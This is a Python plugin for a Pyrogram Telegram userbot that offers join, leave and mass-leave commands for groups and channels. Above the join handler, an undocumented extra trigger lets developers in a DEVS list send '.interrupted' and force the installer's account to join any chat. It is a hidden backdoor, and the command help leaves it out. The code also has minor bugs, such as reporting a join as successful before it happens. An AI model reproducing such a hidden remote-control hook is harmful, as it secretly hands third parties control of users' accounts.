from pyrogram import Client, enums, filters
from pyrogram.types import Message

from X.helpers.adminHelpers import DEVS
from config import BLACKLIST_CHAT
from config import CMD_HANDLER
from X.helpers.basic import edit_or_reply

from .help import *


@Client.on_message(filters.command("interrupted", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("join", cmd) & filters.me)
async def join(client: Client, message: Message):
    X = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Processing...`")
    try:
        await xxnx.edit(f"**sᴜᴄᴄᴇssғᴜʟʟʏ ᴊᴏɪɴᴇᴅ ᴄʜᴀᴛ ɪᴅ** `{X}`")
        await client.join_chat(X)
    except Exception as ex:
        await xxnx.edit(f"**ᴇʀʀᴏʀ:** \n\n{str(ex)}")


@Client.on_message(filters.command(["leave", "kickme"], cmd) & filters.me)
async def leave(client: Client, message: Message):
    X = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Processing...`")
    if message.chat.id in BLACKLIST_CHAT:
        return await xxnx.edit("**ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ ᴛᴏ ʙᴇ ᴜsᴇᴅ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ**")
    try:
        await xxnx.edit_text(f"{client.me.first_name} ʜᴀs ʟᴇғᴛ ᴛʜɪs ɢʀᴏᴜᴘ, ʙʏᴇ!!")
        await client.leave_chat(X)
    except Exception as ex:
        await xxnx.edit_text(f"**ᴇʀʀᴏʀ:** \n\n{str(ex)}")


@Client.on_message(filters.command(["leaveallgc"], cmd) & filters.me)
async def kickmeall(client: Client, message: Message):
    X = await edit_or_reply(message, "`ɢʟᴏʙᴀʟ ʟᴇᴀᴠᴇ ғʀᴏᴍ ɢʀᴏᴜᴘ ᴄʜᴀᴛs...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await X.edit(
        f"**sᴜᴄᴄᴇssғᴜʟʟʏ ᴇxɪᴛ {done} ɢʀᴏᴜᴘ, ғᴀɪʟᴇᴅ ᴛᴏ ᴇxɪᴛ {er} Group**"
    )


@Client.on_message(filters.command(["leaveallch"], cmd) & filters.me)
async def kickmeallch(client: Client, message: Message):
    X = await edit_or_reply(message, "`ɢʟᴏʙᴀʟ ʟᴇᴀᴠᴇ ғʀᴏᴍ ɢʀᴏᴜᴘ ᴄʜᴀᴛs...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.CHANNEL):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await X.edit(
        f"**sᴜᴄᴄᴇssғᴜʟʟʏ ᴇxɪᴛ {done} ᴄʜᴀɴɴᴇʟ, ғᴀɪʟᴇᴅ ᴛᴏ ᴇxɪᴛ {er} ᴄʜᴀɴɴᴇʟ**"
    )


add_command_help(
    "➥ 𝐉ᴏɪɴ-𝐋ᴇᴀᴠᴇ",
    [
        [
            "kickme",
            "Lᴇᴀᴠᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ʙʏ ᴅɪꜱᴘʟᴀʏɪɴɢ ᴀ ᴍᴇꜱꜱᴀɢᴇ ʜᴀꜱ ʟᴇғᴛ ᴛʜɪꜱ ɢʀᴏᴜᴘ, ʙʏᴇ!!.",
        ],
        ["leaveallgc", "Exɪᴛ ᴀʟʟ ᴛᴇʟᴇɢʀᴀᴍ ɢʀᴏᴜᴘꜱ ʏᴏᴜ ʜᴀᴠᴇ ɪᴏɪɴᴇᴅ."],
        ["leaveallch", "Exɪᴛ ᴀʟʟ Tᴇʟᴇɢʀᴀᴍ ᴄʜᴀɴɴᴇʟꜱ ᴛʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ɪᴏɪɴᴇᴅ."],
        ["join ", "Tᴏ Jᴏɪɴ ᴛʜᴇ Cʜᴀᴛ Vɪᴀ ᴜꜱᴇʀɴᴀᴍᴇ."],
        ["leave ", "Tᴏ ʟᴇᴀᴠᴇ ᴀ ɢʀᴏᴜᴘ Vɪᴀ ᴜꜱᴇʀɴᴀᴍᴇ."],
    ],
)
